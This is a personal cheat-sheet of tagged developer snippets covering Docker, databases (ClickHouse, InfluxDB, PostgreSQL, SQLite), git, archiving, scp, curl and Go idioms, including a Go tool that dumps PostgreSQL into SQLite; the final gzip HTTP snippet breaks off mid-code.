(tags: compose enter container)
---

sudo docker-compose exec mycontainer bash
==================================================
Clickhouse client
(tags: clickhouse client)
---

sudo apt install clickhouse-client
clickhouse-client
show tables
select * from mytablename order by ts_nano desc limit 1
==================================================
Influx client
(tags: influx client)
---

sudo apt install influxdb-client
influx
show databases
use grafana
show measurements
// show series
select * from mytablename limit 1

// https://ru.wikipedia.org/wiki/InfluxDB
Недостатки:
- нет update. для этого используется вставка с тем же ключом (временем)
- delete очень долгий (от нескольких секунд на удаление одной записи) и не поддерживает фильтрацию для удаления с использованием колонок (можно с использованием Тэгов или Времени)
- при добавлении нового тега, фильтр по этому тегу для существующих данных недоступен
==================================================
Shutdown linux
(tags: shutdown linux)
---

sudo shutdown -h now
sudo shutdown -h 21:00
sudo shutdown -h +5 "Computer will be shutdown after 5 minutes"
sudo shutdown -c // cancel shutdown
==================================================
Get duplicate records in clickhouse
(tags: duplicate clickhouse)
---

select ts_nano, count(*) from mytablename group by ts_nano having count(*) > 1
==================================================
Git remove remote branch
(tags: git remove remote branch)
---

git
// see all upstreams in branches
git branch -vv
// remove branch on server
push origin --delete badbranchname
// upstream remote branch by local branch
git branch --set-upstream-to origin/goodbranchname
==================================================
Backup files in bash
(tags: bash backup zip)
---

//chmod +x /usr/sbin/backup

#!/bin/bash

PROJECTS_DIR="/home/username/projects"
NAME=backup_$(date +%Y_%m_%d_%H_%M)
START_TIME=$(date +%s)

mkdir /share/$NAME
cp -r $PROJECTS_DIR/project1 /share/$NAME/project1
cp -r $PROJECTS_DIR/project2 /share/$NAME/project2
cp -r $PROJECTS_DIR/project3 /share/$NAME/project3

cd /share

zip -r $NAME.zip $NAME > /dev/null

rm -r /share/$NAME

END_TIME=$(date +%s)
DIFF=$(( $END_TIME - $START_TIME))
FILE_SIZE=$(du -h /share/$NAME.zip)

echo "backup $FILE_SIZE was created in $DIFF s"
==================================================
Debugging golang code from terminal
(tags: debug terminal)
---

cd root/go/src/github.com/DimitryEf/experiment
vi main.go
  write the app (i) and save it (ESC :wq)
go run main.go
go get github.com/go-delve/delve/cmd/dlv
dlv debug
h
b main.main
b main.go:10
n
c
q
disass
==================================================
Postgresql json field
(tags: postgresql json field)
---

SELECT
  mt.jsonfield
FROM kso.mytable mt
WHERE mt.jsonfield->>'somefield' = 'somename'
==================================================
Postgresql json array
(tags: postgresql json array)
---

SELECT * FROM
(SELECT
  mt.name,
  json_array_elements(mt.jsonarray->'arrayname')->'jsonvalue' as jsonvalue
FROM mytable mt) t
WHERE t.jsonvalue::text = '\"somevalue\"'
==================================================
Postgresql loop
(tags: postgresql loop)
---

do $$
declare
  result_var text default '';
  counter int default 0;
begin
  result_var := 'qwe';
  drop table if exists tmp_qwe;
  create temp table tmp_qwe(result text);
  insert into tmp_qwe (result) values (result_var);
  loop

    counter := counter + 1;
    if counter = 5 then exit;
    end if;

    update tmp_qwe set result = result || counter::text;
  end loop;
end $$;

select * from tmp_qwe;
==================================================
Solve problems with using ebiten library
(tags: ebiten problem)
---

sudo apt-get install libglfw3 libglfw3-dev
sudo apt-get install libx11-dev
sudo apt install libxcursor-dev
sudo apt install libxtst-dev
sudo apt-get install libxcomposite-dev libxdamage-dev libxrender-dev
sudo apt-get install libxinerama-dev
sudo apt-get install libgl1-mesa-dev xorg-dev
==================================================
Debugging plugins
(tags: debug plugin)
---

// run debug with this flag
-gcflags="all=-N -l"
==================================================
Git squash commits
(tags: git squash)
---

1. specify the hash of the commit to which you need to squash other commits
git rebase -I dfs878
2. in the editor that opens, leave pick (or p) opposite the commit to which we squash everything (the first will fit, the last will not)
3. in other commits write squash (или s)
4. save the file
5. git merges commits and prompts you to choose a name
6. save the file
7. ready (you may check it with git log)
==================================================
Using postgresql in docker
(tags: postgresql docker)
---

docker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5432:5432 postgres
docker ps
docker exec -it 05b3a3471f6f bash
root@05b3a3471f6f:/# psql -U postgres
postgres-# CREATE DATABASE mytest;
postgres-# \q

// from localhost
psql -h public-ip-server -p 5432 -U postgres
==================================================
Dump postgresql to sqlite
(tags: dump postgresql sqlite)
---

package main

import (
  "context"
  "database/sql"
  "fmt"
  _ "github.com/lib/pq"
  _ "github.com/mattn/go-sqlite3"
  "log"
  "time"
)

func main() {
  dbname := "mydb"
  schema := "myschema"
  postgresqlConString := "user=myuser password=mypass dbname=mydb host=localhost port=5432 search_path=myschema sslmode=disable"
  sqliteConString := "mydb.db"
  log.SetFlags(log.LstdFlags | log.Lshortfile)
  t1 := time.Now()
  transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema)
  t := time.Since(t1)
  ms := t.Milliseconds()
  log.Printf("took time %d ms", ms)
}

func transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema string) {

  // connect to postgresql
  db, err := sql.Open("postgres", postgresqlConString)
  checkErr(err)
  ctx := context.Background()
  err = db.PingContext(ctx)
  checkErr(err)
  defer db.Close()

  // get all tables
  tables, err := db.QueryContext(ctx, "SELECT tablename FROM pg_tables WHERE schemaname = $1 ORDER BY tablename", schema)
  checkErr(err)
  defer tables.Close()

  // connect to sqlite, create file if not exists
  dbsqlite, err := sql.Open("sqlite3", sqliteConString)
  checkErr(err)
  defer db.Close()

  for tables.Next() {

    var tableName string
    tables.Scan(&tableName)
    log.Printf("table: %s", tableName)

    // get fields name and data type for current table
    fields, err := db.QueryContext(ctx, "SELECT column_name, data_type FROM information_schema.columns WHERE table_catalog = $1 AND table_schema = $2 AND table_name = $3 ORDER BY ordinal_position", dbname, schema, tableName)
    checkErr(err)

    // create table (do not drop table! because if table exists user must see this so as not to accidentally overwrite data)
    createTableString := buildCreateTableString(tableName, fields)
    _, err = dbsqlite.ExecContext(ctx, createTableString)
    checkErr(err)

    // get all rows from table
    rows, err := db.QueryContext(ctx, fmt.Sprintf("SELECT * FROM \"%s\".\"%s\"", check(schema), check(tableName))
    checkErr(err)
    columns, err := rows.Columns()
    checkErr(err)

    // start transaction
    tx, err := dbsqlite.Begin()
    checkErr(err)

    // prepare improves performance more than 600 times
    stmt, err := tx.Prepare(buildPrepareString(tableName, columns))
    checkErr(err)

    // prepare args as pointers
    args := make([]interface{}, len(columns))
    for i := range columns {
      args[i] = &sql.NullString{String: columns[i]}
    }

    // from postgresql to sqlite
    count := 0
    for rows.Next() {
      err := rows.Scan(args...)
      checkErr(err)
      _, err = stmt.Exec(args...)
      checkErr(err, args...)
      count++
    }
    log.Printf("\trows: %d", count)

    // commit transaction
    err = tx.Commit()
    checkErr(err)

    rows.Close()
    stmt.Close()
  }

}

func buildCreateTableString(tableName string, fields *sql.Rows) string {
  defer fields.Close()
  res := fmt.Sprintf("CREATE TABLE \"%s\" (", tableName)
  for fields.Next() {
    var field, dataType string
    err := fields.Scan(&field, &dataType)
    checkErr(err)
    res += fmt.Sprintf("\n\t\"%s\"\t%s,", field, convertType(dataType))
    log.Printf("\tcolumn: %s", field)
  }
  res = res[:len(res)-1]
  res += "\n)"
  return res
}

func convertType(dataType string) string {
  switch dataType {
  case "\"char\"", "character varying", "date", "text":
    return "TEXT"
  case "bigint", "boolean", "integer", "smallint":
    return "INTEGER"
  case "double precision", "numeric", "real":
    return "REAL"
  case "bytea":
    return "BLOB"
  default:
    return "TEXT"
  }
}

func check(s string) string {
  if strings.Contains(s, "\"") {
    log.Fatalf("bad char in \"%s\"", s)
  }
  return s
}

func checkErr(err error, args ...interface{}) {
  if err != nil {
    log.Fatalf("%q: %s", err, args)
  }
}

func buildPrepareString(tableName string, columns []string) string {
  res := fmt.Sprintf("INSERT INTO \"%s\" (", tableName)
  count := 0
  for _, col := range columns {
    res += fmt.Sprintf("\"%s\",", col)
    count++
  }
  res = res[:len(res)-1]
  res += ") VALUES ("
  for i := 0; i < count; i++ {
    res += "?,"
  }
  res = res[:len(res)-1]
  res += ")"
  return res
}
==================================================
Graceful shutdown
(tags: graceful shutdown)
---

func action(c *cli.Context) error {
  startTime := time.Now()

  finish := make(chan struct{})

  ctx, cancel := context.WithCancel(context.Background())
  go act(ctx, finish)
  defer cancel()

  go gracefulShutdown(finish, cancel)

  <-finish
  endTime := time.Since(startTime)
  ms := endTime.Milliseconds()
  log.Printf("took time: %d ms", ms)

  return nil
}

func gracefulShutdown(finish chan<- struct{}, cancel context.CancelFunc) {
  interrupt := make(chan os.Signal, 1)
  signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)

  <-interrupt

  log.Printf("interrupted, sql queries will be canceled in 3 seconds")
  cancel()
  time.Sleep(3 * time.Second)
  defer func() {
    finish <- struct{}{}
  }()
}
==================================================
Goland hotkeys
(tags: hotkeys goland)
---

alt+j - select the same words
shift+enter = start new line (open file in split right)
ctrl+alt+enter - start new line before current
ctrl+w - extend selection
ctrl+shift+w - shrink selection
ctrl+shift+u - toggle case
ctrl+alt+shift+lmb (left mouse) - multiselect
ctrl+[ - move to code block start
ctrl+] - move to code block end
ctrl+shift+[ - move to code block start with select
ctrl+shift+] - move to code block end with select
ctrl+y - delete line
ctrl+delete - delete to word end
ctrl+backspace - delete to word start
ctrl+d - duplicate line or selection (compare files)
ctrl+shift+j - join lines
ctrl+shift+m - move to matching brace
ctrl+shift+insert - column selection mode
tab - next parameter
shift+tab - prev parameter
f2 - next highlight editor
shift+f2 - prev highlight editor
ctrl+alt+left - back
ctrl+alt+right - forward
ctrl+n - go to type
ctrl+shift+n - go to file
ctrl+b - go to declaration or usage
ctrl+alt+b - go to implementation
ctrl+shift+b - go to type declaration
ctrl+shift+t go to test
ctrl+f12 - file structure
ctrl+alt+shift+2 - file path
ctrl+h - type hierarchy
ctrl+shift+h - method hierarchy
ctrl+alt+h - call hierarchy
ctrl+/ - comment code
ctrl+shift+/ - comment block
ctrl+alt+l - reformat code
ctrl+alt+shift+l - reformat file
ctrl+shift+down - move statement down
ctrl+shift+up - move statement up
ctrl+alt+shif+left - move element left
ctrl+alt+shif+right - move element right
alt+shift+down - move line down
alt+shift+up - move line up
shift+f6 - rename (edit changelist)
ctrl+f6 - change signature
ctrl+alt+m - extract method
ctrl+alt+n - inline
shift+f10 - run
shift+f9 - debug
ctrl+f2 - stop
f8 - step over
f7 - step into
shift+f8 - step out
alt+shift+9 - run to cursor
f9 - resume
ctrl+alt+shift+p - go fmt project
ctrl+alt+g - go generate file
alt+0 - commit window
alt+1 - project window
alt+2 - favorites window
alt+3 - find window
alt+4 - run window
alt+5 - debug window
alt+6 - problems window
alt+7 - structure window
alt+8 - services window
alt+9 - git window
alt+f12 - terminal window
ctrl+k - commit
ctrl+shift+k - push
ctrl+t - update project
ctrl+alt+shift+down - next change
ctrl+alt+shift+up - prev change
ctrl+alt+a - add to git
ctrl+shift+g - go file (my setting)
==================================================
Backup postgresql and restore it in docker
(tags: backup postgresql docker)
---

pg_dump -h 192.168.0.2 -d mydb -p 5432 -U myuser > /temp/mydb.dump
docker cp /temp/mydb.dump my-pg-container:/home/mydb.dump
docker exec -it my-pg-container bash
// dropdb -U postgres 'mydb'
// psql
// \l
// CREATE DATABASE mydb WITH ENCODING='UTF-8';
// \du
// \q
// create role myuser superuser
psql -U postgres mydb < /home/mydb.dump
\\ \c
\\ \dt
\\ select * from pg_catalog.pg_tables;
==================================================
Git push tag
(tags: git tag)
---

// add tag to commit
git tag -a 1.0.2 e50f795
// one tag
git push origin v1.0.0
// many tags
git push origin --tags
// remove tag
git push origin :v1.0.0
// show tag
git show v1.0.0
==================================================
Linux tar, gzip, zip, unzip
(tags: linux tar gzip zip unzip)
---

tar -cf archive.tar foo bar    # Create archive.tar from files foo and bar.
tar -cfz archive.tar.gz foodir # Create archive.tar.gz from dir with gzip compress.
tar -tvf archive.tar           # List all files in archive.tar verbosely.
tar -xf archive.tar            # Extract all files from archive.tar.
tar -xzvf foo.tar.gz dir/sdir  # Extract subdir
  -c # Create new archive
  -f # Name of archive
  -t # List all files in in archive
  -v # Verbosely list files processed
  -z # Use gzip
  -j # Use bzip2
# by size: dir.tar.gz < dir < dir.tar

unzip archive.zip
unzip -tq archive.zip      # Test archive for errors
unzip archive.zip -d /tmp  # Extract into some dir
unzip -l archive.zip       # List of entry files

gzip file.log      # Create archive file.log.gz
gunzip archive.gz  # Unpack archive

zip --encrypt secure.zip file  # Create archive with password
Enter password:
Verify password:
# Create archive.zip with max compress (-9) exclude folder "/var/log/apt/*"
zip -r -9 archive.zip /var/log/* /var/spool/* -x "/var/log/apt/*"
==================================================
Table test
(tags: table test)
---

func TestConvertQueryToTopic(t *testing.T) {
  type args struct {
    query string
  }
  tests := []struct {
    name string
    args args
    want Topic
  }{
    {
      name: "simple",
      args: args{query: "Extract beginning of string (prefix)\n(tags: extract beginning string prefix)\n---\n\nt := string([]rune(s)[:5])"},
      want: Topic{
        Title:   "Extract beginning of string (prefix)",
        Code:    "t := string([]rune(s)[:5])",
        Checked: false,
        Tags: []Tag{
          {Name: "extract"},
          {Name: "beginning"},
          {Name: "string"},
          {Name: "prefix"},
        },
      },
    },
  }
  for _, tt := range tests {
    t.Run(tt.name, func(t *testing.T) {
      if got, _ := ConvertQueryToTopic(tt.args.query); !reflect.DeepEqual(got, tt.want) {
        t.Errorf("ConvertQueryToTopic() = %v, want %v", got, tt.want)
      }
    })
  }
}
==================================================
Types in MySQL, PostgreSQL, SQLite
(tags: type mysql postgresql sqlite)
---

https://stackoverflow.com/questions/1942586/comparison-of-database-column-types-in-mysql-postgresql-and-sqlite-cross-map

MySQL               PostgreSQL          SQLite

TINYINT             SMALLINT            INTEGER
SMALLINT            SMALLINT
MEDIUMINT           INTEGER
BIGINT              BIGINT
BIT                 BIT                 INTEGER
___________________________________________________

TINYINT UNSIGNED    SMALLINT            INTEGER
SMALLINT UNSIGNED   INTEGER
MEDIUMINT UNSIGNED  INTEGER
INT UNSIGNED        BIGINT
BIGINT UNSIGNED     NUMERIC(20)
___________________________________________________

DOUBLE              DOUBLE PRECISION    REAL
FLOAT               REAL                REAL
DECIMAL             DECIMAL             REAL
NUMERIC             NUMERIC             REAL
___________________________________________________

BOOLEAN             BOOLEAN             INTEGER
___________________________________________________

DATE                DATE                TEXT
TIME                TIME
DATETIME            TIMESTAMP
___________________________________________________

TIMESTAMP DEFAULT   TIMESTAMP DEFAULT   TEXT
NOW()               NOW()
___________________________________________________

LONGTEXT            TEXT                TEXT
MEDIUMTEXT          TEXT                TEXT
BLOB                BYTEA               BLOB
VARCHAR             VARCHAR             TEXT
CHAR                CHAR                TEXT
___________________________________________________

columnname INT      columnname SERIAL   INTEGER PRIMARY
AUTO_INCREMENT                          KEY AUTOINCREMENT
==================================================
SQLite syntax
(tags: sqlite syntax)
---

CREATE TABLE test (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    model TEXT
);
INSERT INTO test (id, model) VALUES (7, 'a')
INSERT INTO test (id, model) VALUES (2, 'ab')
INSERT INTO test (model) VALUES ('abc')
SELECT ROWID, id, model FROM test
  2 2 ab
  7 7 a
  8 8 abc
// and the same without AUTOINCREMENT

CREATE VIEW model_names AS
  SELECT model || '_' || id
  FROM test

CREATE TEMP TABLE tmp_1 (name TEXT)

// aggregate functions
AVG    Return the average value of non-null values in a group
COUNT  Return the total number of rows in a table.
MAX    Return the maximum value of all values in a group.
MIN    Return the minimum value of all values in a group.
SUM    Return the sum of all non-null values in a column
GROUP_CONCAT  Concatenate non-null values in a column

// string functions
SUBSTR  Extract and returns a substring with a predefined length starting at a specified position in a source string
TRIM    Return a copy of a string that has specified characters removed from the beginning and the end of a string.
LTRIM   Return a copy of a string that has specified characters removed from the beginning of a string.
RTRIM   Return a copy of a string that has specified characters removed from the end of a string.
LENGTH  Return the number of characters in a string or the number of bytes in a BLOB.
REPLACE Return a copy of a string with each instance of a substring replaced by the other substring.
UPPER   Return a copy of a string with all of the characters converted to uppercase.
LOWER   Return a copy of a string with all of the characters converted to lowercase.
INSTR   Find a substring in a string and returns an integer indicating the position of the first occurrence of the substring.

// control flow functions
COALESCE  Return the first non-null argument
IFNULL    Provide the NULL if/else construct
IIF       Add if-else logic to queries - IIF(expression, true_expression, false_expression).
NULLIF    Return NULL if the first argument is equal to the second argument.

// date and time functions
DATE       Calculate the date based on multiple date modifiers.
TIME       Calculate the time based on multiple date modifiers.
DATETIME   Calculate the date & time based on one or more date modifiers.
JULIANDAY  Return the Julian day, which is the number of days since noon in Greenwich on November 24, 4714 B.C.
STRFTIME   Format the date based on a specified format string.

// math functions
ABS     Return the absolute value of a number
RANDOM  Return a random floating-point value between the minimum and maximum integer values
ROUND   Round off a floating value to a specified precision.
==================================================
Copy files over SSH
(tags: copy file ssh)
---

https://www.shellhacks.com/copy-files-ssh-10-examples/

// Example 1: Copy the file “file.txt” from a remote host to the local host.
scp user@remote.host:file.txt /some/local/directory
// Example 2: Copy the file “file.txt” from the local host to a remote host.
scp file.txt user@remote.host:/some/remote/directory
// Example 3: Copy the directory “dir1” from the local host to a remote host’s directory “dir2”.
scp -r dir1 user@remote.host:/some/remote/directory/dir2
// Example 4: Copy the file “file.txt” from remote host “remote.host1” to remote host “remote.host2”.
scp user@remote.host1:/directory/file.txt user@remote.host2:/some/directory/
// Example 5: Copy the files “file1.txt” and “file2.txt” from the local host to your home directory on the remote host.
scp file1.txt file2.txt user@remote.host:~
// Example 6: Copy the file “file.txt” from the local host to a remote host using port 2222.
scp -P 2222 file.txt user@remote.host:/some/remote/directory
// Example 7: Copy the file “file.txt” from the local host to a remote host’s home directory. Preserve the modification and access times, as well as the permissions of the source-file in the destination-file.
scp -p file.txt user@remote.host:~
// Example 8: Copy the file “file.txt” from the local host to a remote host’s home directory. Increase SCP speed by changing the cipher from the default AES-128 to Blowfish.
scp -c blowfish file.txt user@remote.host:~
// Example 9: Copy the file “file.txt” from the local host to a remote host’s home directory. limit the bandwidth used by SCP command to 100 Kbit/s.
scp -l 100 file.txt user@remote.host:~
// Example 10: Copy multiple files from the remote host to your current directory on the local host.
scp user@remote.host:~/\{file1,file2,file3\} .
==================================================
Linux telnet
(tags: linux telnet)
---

// check server available
telnet 192.168.1.243
// check port available
telnet localhost 123
// debug mode with more info
telnet -d localhost 22
// show telnet commands
// Ctrl+[
// telnet>
status
// GET
telnet opennet.ru 80
GET /
==================================================
Linux curl
(tags: linux curl)
---

// Download file and show it in output
curl https://raw.githubusercontent.com/curl/curl/master/README.md
// Download into file
curl -o readme.txt https://raw.githubusercontent.com/curl/curl/master/README.md
// Save with the same name (README.md)
curl -O https://raw.githubusercontent.com/curl/curl/master/README.md
// Restore downloading after interrupt
curl -# -C - -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz
// Download many files
curl -O https://raw.githubusercontent.com/curl/curl/master/README.md -O https://raw.githubusercontent.com/curl/curl/master/README
// Download file if id has been modified
curl -z 21-Dec-17 https://raw.githubusercontent.com/curl/curl/master/README.md
// Limit download speed
curl --limit-rate 50K -O https://cdn.kernel.org/pub/linux/kernel/v4.x/testing/linux-4.11-rc7.tar.xz
// Close connection if speed less than needed
curl -Y 100 -O https://raw.githubusercontent.com/curl/curl/master/README.md
// Send file to ftp server
curl -T login.txt ftp://speedtest.tele2.net/upload/
// Show where ftp server saved our file
curl -T ~/login.txt http://posttestserver.com/post.php
// POST
curl -d "field1=val&fileld2=val1" http://posttestserver.com/post.php
// Form POST
curl -F "password=@pass;type=text/plain" http://posttestserver.com/post.php
// Save cookie in file
curl -c cookie.txt http://posttestserver.com/post.php
// Send cookie from file to server
curl -b cookie.txt http://posttestserver.com/post.php
// Show headers
curl -I https://losst.ru
// Set header to request
curl -I --header 'If-Modified-Since: Mon, 26 Dec 2016 18:13:12 GMT' https://losst.ru
// Using auth
curl -u ftpuser:ftppass -T - ftp://ftp.testserver.com/myfile_1.txt
// Using proxy
curl -x proxysever.test.com:3128 http://google.co.in
// Send json
curl -H "Content-Type: application/json" \
  -X POST \
  -d '{"username":"xyz","password":"xyz"}' \
  http://localhost:3000/api/login
// Send file
curl POST -d @path/to/file http://user:pass@myhost:myport/path/of/url
==================================================
Elasticsearch in docker
(tags: elasticsearch docker)
---

https://www.freecodecamp.org/news/go-elasticsearch/

// Run in docker
docker run -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" docker.elastic.co/elasticsearch/elasticsearch:7.10.1
// Create index
curl -H "Content-Type: application/json" -X PUT -d '{ "settings": {"number_of_shards": 1, "number_of_replicas": 1 }, "mappings": { "properties": { "name": { "type": "text" }, "age": { "type": "integer" }, "average_score": { "type": "float" }} } }'   http://localhost:9200/students

// main.go for insert data
package main

import (
  "context"
  "encoding/json"
  "fmt"
  "gopkg.in/olivere/elastic.v7"
)

type Student struct {
  Name         string  `json:"name"`
  Age          int64   `json:"age"`
  AverageScore float64 `json:"average_score"`
}

func GetESClient() (*elastic.Client, error) {
  client, err :=  elastic.NewClient(elastic.SetURL("http://localhost:9200"),
    elastic.SetSniff(false),
    elastic.SetHealthcheck(false))

  fmt.Println("ES initialized...")
  return client, err
}

func main() {
  ctx := context.Background()
  esclient, err := GetESClient()
  if err != nil {
    fmt.Println("Error initializing : ", err)
    panic("Client fail ")
  }

  //creating student object
  newStudent := Student{
    Name:         "Gopher doe",
    Age:          10,
    AverageScore: 99.9,
  }

  dataJSON, err := json.Marshal(newStudent)
  js := string(dataJSON)
  _, err = esclient.Index().
    Index("students").
    BodyJson(js).
    Do(ctx)

  if err != nil {
    panic(err)
  }
  fmt.Println("[Elastic][InsertProduct]Insertion Successful")
}

// Find matched
curl -H "Content-Type: application/json" -X POST -d '{"query":{"match":{"name":"doe"}}}' http://localhost:9200/students/_search

// main.go for search data
package main

import (
  "context"
  "encoding/json"
  "fmt"
  elastic "gopkg.in/olivere/elastic.v7"
)

func main() {
  ctx := context.Background()
  esclient, err := GetESClient()
  if err != nil {
    fmt.Println("Error initializing : ", err)
    panic("Client fail ")
  }

  var students []Student

  searchSource := elastic.NewSearchSource()
  searchSource.Query(elastic.NewMatchQuery("name", "Doe"))

  /* this block will basically print out the es query */
  queryStr, err1 := searchSource.Source()
  queryJs, err2 := json.Marshal(queryStr)

  if err1 != nil || err2 != nil {
    fmt.Println("[esclient][GetResponse]err during query marshal=", err1, err2)
  }
  fmt.Println("[esclient]Final ESQuery=\n", string(queryJs))
    /* until this block */

  searchService := esclient.Search().Index("students").SearchSource(searchSource)

  searchResult, err := searchService.Do(ctx)
  if err != nil {
    fmt.Println("[ProductsES][GetPIds]Error=", err)
    return
  }

  for _, hit := range searchResult.Hits.Hits {
    var student Student
    err := json.Unmarshal(hit.Source, &student)
    if err != nil {
      fmt.Println("[Getting Students][Unmarshal] Err=", err)
    }

    students = append(students, student)
  }

  if err != nil {
    fmt.Println("Fetching student fail: ", err)
  } else {
    for _, s := range students {
      fmt.Printf("Student found Name: %s, Age: %d, Score: %f \n", s.Name, s.Age, s.AverageScore)
    }
  }
}
==================================================
Anonymous structs for template data
(tags: anonymous struct template)
---

https://talks.golang.org/2015/tricks.slide

package main

import (
  "log"
  "os"
  "text/template"
)

func main() {
  data := struct {
    FirstName string
    LastName string
  }{
    "John",
    "Doe",
  }
  tmpl := template.Must(template.New("name").Parse("Hello, {{.FirstName}} {{.LastName}}!"))
  if err := tmpl.Execute(os.Stdout, data); err != nil {
    log.Fatal(err)
  }
}
==================================================
Anonymous structs for json
(tags: anonymous struct json)
---

https://talks.golang.org/2015/tricks.slide

// encoging from struct to json
b, err := json.Marshal(struct {
    ID   int
    Name string
}{42, "The answer"})
if err != nil {
    log.Fatal(err)
}
fmt.Printf("%s\n", b)

// decoding ftom json to struct
var data struct {
    ID     int
    Person struct {
        Name string
        Job  string
    }
}
const s = `{"ID":42,"Person":{"Name":"George Costanza","Job":"Architect"}}`
err := json.Unmarshal([]byte(s), &data)
if err != nil {
    log.Fatal(err)
}
fmt.Println(data.ID, data.Person.Name, data.Person.Job)
==================================================
Anonymous structs with embedded mutex
(tags: anonymous struct embedded mutex)
---

https://talks.golang.org/2015/tricks.slide

var viewCount struct {
    sync.Mutex
    n int64
}

viewCount.Lock()
viewCount.n++
viewCount.Unlock()
==================================================
Anonymous structs with implementing interfaces
(tags: anonymous struct implement interface)
---

https://talks.golang.org/2015/tricks.slide

return struct {
    io.ReadSeeker
    io.Closer
}{
    io.NewSectionReader(strings.NewReader(s), 0, int64(len(s))),
    ioutil.NopCloser(nil),
}
==================================================
Anonymous interfaces
(tags: anonymous interface)
---

https://talks.golang.org/2015/tricks.slide

var s interface {
        String() string
    } = bytes.NewBufferString("I'm secretly a fmt.Stringer!")
    fmt.Println(s.String())

// or
// Check that we can access methods of the underlying os.File.
if _, ok := stdin.(interface {
    Fd() uintptr
}); !ok {
    t.Error("can't access methods of underlying *os.File")
}
==================================================
Method values
(tags: method value)
---

https://talks.golang.org/2015/tricks.slide

// Evaluating a method from a type yields a function:
var f func(*bytes.Buffer, string) (int, error)
var buf bytes.Buffer
f = (*bytes.Buffer).WriteString
f(&buf, "y u no buf.WriteString?")
buf.WriteTo(os.Stdout)

// Evaluating a method from a value creates a closure that holds that value:
var f func(string) (int, error)
var buf bytes.Buffer
f = buf.WriteString
f("Hey... ")
f("this *is* cute.")
buf.WriteTo(os.Stdout)
==================================================
Using sync.Once
(tags: sync once)
---

https://talks.golang.org/2015/tricks.slide

// Once is an object that will perform exactly one action.
// type Once struct { /* Has unexported fields. */ }
// func (o *Once) Do(f func())

type LazyPrimes struct {
    once   sync.Once // Guards the primes slice.
    primes []int
}

func (p *LazyPrimes) init() {
    // Populate p.primes with prime numbers.
}

func (p *LazyPrimes) Primes() []int {
    p.once.Do(p.init)
    return p.primes
}
==================================================
Comparable types
(tags: comparable type)
---

https://talks.golang.org/2015/tricks.slide

// Bools, ints, floats, complex numbers, strings, pointers,
// channels, structs, and interfaces are comparable.

var a, b int = 42, 42
fmt.Println(a == b) // true

var i, j interface{} = a, b
fmt.Println(i == j) // true

var s, t struct{ i interface{} }
s.i, t.i = a, b
fmt.Println(s == t) // true

// A struct is comparable only if its fields are comparable:
var q, r struct{ s []string }
fmt.Println(q == r) // build failed
==================================================
Map keys
(tags: map key)
---

https://talks.golang.org/2015/tricks.slide

// Any comparable type may be used as a map key.

a := map[int]bool{}
a[42] = true

type T struct {
    i int
    s string
}

b := map[*T]bool{}
b[&T{}] = true

c := map[T]bool{}
c[T{37, "hello!"}] = true

d := map[interface{}]bool{}
d[42] = true
d[&T{}] = true
d[T{123, "four five six"}] = true
d[ioutil.Discard] = true


// Interfaces as map keys
// An example of interface map keys from Docker's broadcastwriter package:

type BroadcastWriter struct {
    sync.Mutex
    writers map[io.WriteCloser]struct{}
}

func (w *BroadcastWriter) AddWriter(writer io.WriteCloser) {
    w.Lock()
    w.writers[writer] = struct{}{}
    w.Unlock()
}

func (w *BroadcastWriter) Write(p []byte) (n int, err error) {
    w.Lock()
    for sw := range w.writers {
        if n, err := sw.Write(p); err != nil || n != len(p) {
            delete(w.writers, sw)
        }
    }
    w.Unlock()
    return len(p), nil
}

// Structs and interfaces together as map keys
// A (very) contrived example: (Don't do this! Ever!)

type cons struct {
    car string
    cdr interface{}
}

func (c cons) String() string {
    if c.cdr == nil || c.cdr == (cons{}) {
        return c.car
    }
    return fmt.Sprintf("%v %v", c.car, c.cdr)
}

func main() {
    m := map[cons]string{}
    c := cons{}
    for _, s := range []string{"life?", "with my", "I doing", "What am"} {
        c = cons{s, c}
    }
    m[c] = "No idea."
    fmt.Println(c, m[c])
}
==================================================
Using atomic.Value
(tags: atomic value)
---

https://talks.golang.org/2015/tricks.slide

// For instance, to share configuration between many goroutines:
type Config struct {
    Timeout time.Duration
}
var config atomic.Value

// To set or update, use the Store method:
config.Store(&Config{Timeout: 2*time.Second})

// To read, each goroutine calls the Load method:
// Note that storing different types in the same Value will cause a panic.
cfg := config.Load().(*Config)
==================================================
Running Gitlab in docker container
(tags: gitlab docker)
---

// run container
docker run --detach \
  --hostname gitlab \
  --publish 443:443 --publish 8880:80 --publish 22:22 \
  --name gitlab \
  --restart always \
  --volume $GITLAB_HOME/config:/etc/gitlab \
  --volume $GITLAB_HOME/logs:/var/log/gitlab \
  --volume $GITLAB_HOME/data:/var/opt/gitlab \
  gitlab/gitlab-ee:latest

// wait and try http://localhost:8880
// set pass
// push your project into gitlab repository or clone

// run gitlab-runner
docker run -d --name gitlab-runner --restart always \
  -v /srv/gitlab-runner/config:/etc/gitlab-runner \
  -v /var/run/docker.sock:/var/run/docker.sock \
  gitlab/gitlab-runner:latest

// create common network
docker network create gitlab-network
docker network connect gitlab-network gitlab
docker network connect gitlab-network gitlab-runner

// enter into gitlab-runner container
docker exec -it gitlab-runner bash
gitlab-runner register --docker-network-mode gitlab-network
// for unregister: gitlab-runner unregister --url http://gitlab --token -e3TaynkopkA-DaXpzy3
// get token for unregister by command: gitlab-runner list
// use name of gitlab container for Gitlab unstance URL
http://gitlab
// use token from http://localhost:8880/ -> Settings -> CI/CD -> Runners
some description
some-tag
docker
golang:latest
// update http://localhost:8880/...
// in runner settings enable "Run untagged jobs"

// in project add .gitlab-ci.yml file with content like this:
stages:
  - compile
  - test

build:
  stage: compile
  image: golang:latest
  script:
    - go build -mod=vendor -o bin/app -v cmd/greeter/main.go

test:
  stage: test
  image: golang:latest
  script:
    - echo "this is stage test"

// push changes into repository
// see http://localhost:8880/ -> CI/CD -> Pipelines
==================================================
Reading gzipped HTTP response
(tags: gzip http)
---

https://stackoverflow.com/questions/13130341/reading-gzipped-http-response-in-go

client := new(http.Client)

request, err := http.NewRequest("GET", "http://stackoverflow.com", nil)
request.Header.Add("Accept-Encoding", "gzip")

response, err := client.Do(request)
defer response.Body.Close()

// Check that the server actually sent compressed data
var reader io.ReadCloser
switch response.Header.Get("Content-Encoding") {
case "gzip":
    reader, err = gzip.NewReader(response.Body)
